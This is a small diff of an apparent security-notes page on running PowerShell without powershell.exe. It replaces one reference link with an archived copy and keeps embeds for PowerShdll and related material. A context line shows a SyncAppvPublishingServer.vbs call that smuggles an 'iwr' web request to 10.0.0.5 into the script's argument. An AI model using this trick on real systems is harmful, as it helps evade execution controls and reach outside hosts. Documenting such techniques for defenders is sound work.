@@ -30,6 +30,6 @@ SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
 
 {% embed url="https://github.com/p3nt4/PowerShdll" %}
 
-{% embed url="https://safe-cyberdefense.com/malware-can-use-powershell-without-powershell-exe/" %}
+{% embed url="https://web.archive.org/web/20180202001408/https://safe-cyberdefense.com/malware-can-use-powershell-without-powershell-exe/" %}
 
 {% embed url="https://www.youtube.com/watch?v=7tvfb9poTKg" %}
